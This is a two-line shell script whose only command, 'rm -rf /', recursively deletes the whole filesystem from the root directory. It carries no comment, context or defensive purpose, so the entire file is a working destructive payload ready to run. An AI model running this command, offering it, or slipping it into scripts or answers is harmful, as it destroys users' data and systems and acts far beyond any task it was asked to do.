#!/bin/sh
rm -rf /
